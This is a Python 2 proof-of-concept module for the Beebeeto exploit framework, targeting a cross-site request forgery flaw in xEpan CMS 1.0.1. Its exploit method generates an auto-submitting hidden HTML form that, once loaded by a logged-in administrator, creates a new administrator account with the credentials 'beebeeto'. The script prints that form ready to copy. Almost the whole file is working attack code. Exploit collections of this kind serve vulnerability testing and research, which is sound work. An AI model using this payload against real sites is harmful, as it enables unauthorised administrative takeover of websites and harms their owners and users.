#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0171',
            'name': 'xEpan CMS 1.0.1 CSRF Add Admin Exploit',
            'author': '小马甲',
            'create_date': '2014-11-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'xEpan',
            'vul_version': ['1.0.1'],
            'type': 'Cross Site Request Forgery',
            'tag': ['xEpan CMS漏洞', 'CSRF', 'php'],
            'desc': 'CSRF exploit below creates an administrative account with username/password: "beebeeto"',
            'references': ['http://www.exploit-db.com/exploits/35381/',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Generation: ' + verify_url
        temp = '''
        <form action="%s/?page=owner/users&web_owner_users_crud_virtualpage=add&submit=web_web_owner_users_crud_virtualpage_form" method="post" name="main">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_name" value="name">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_email" value="email@email.com">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_username" value="beebeeto">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_password" value="beebeeto">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_created_at" value="21/10/2014">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_type" value="100">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_is_active" value="1">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_activation_code" value="">
        <input type="hidden" name="web_web_owner_users_crud_virtualpage_form_last_login_date" value="">
        <input type="hidden" name="ajax_submit" value="form_submit">
        <input type="submit" id="btn">
        </form>
         
        <script>
        document.main.submit();
        </script>
        ''' % verify_url
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())